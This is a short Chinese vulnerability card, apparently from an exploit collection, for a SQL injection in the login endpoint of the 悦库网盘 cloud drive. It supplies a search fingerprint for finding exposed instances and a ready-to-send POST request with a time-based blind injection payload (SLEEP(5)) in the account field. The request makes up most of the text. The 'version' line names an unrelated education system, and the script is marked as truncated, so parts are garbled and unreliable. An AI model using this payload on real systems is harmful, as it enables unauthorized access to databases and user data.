# 悦库网盘aRegisAdmin存在SQL注入漏洞

- **系统**：悦库网盘　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="悦库-悦库网盘"`
- **请求**：`POST /user/login/.html HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Cookie: windowWidth=1036; windowHeight=846; yid=4m6jbq6mrd5mui6ul2gr3s9fl4; lang=zh-cn; …`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 154`

**请求体 / payload**
```
account=admin') AND (SELECT 4215 FROM (SELECT(SLEEP(5)))CFVi)-- WUij&password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918&clientId=5E9B11EB90214398ADA353DF7F014E9C&referer=&keepLogin=false
POST /user/login/.html HTTP/1.1
Host:
X-Requested-With: XMLHttpRequest
Cookie: windowWidth=1036; windowHeight=846; yid=4m6jbq6mrd5mui6ul2gr3s9fl4; lang=zh-cn; device=desktop; theme=default
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
account=admin&password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918&clientId=5E9B11EB90214398ADA353DF7F014E9C&ref…（脚本共 621 字，完整版见原文）
```

**其他**
- 悦库网盘aRegisAdmin存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 企慧通教育系统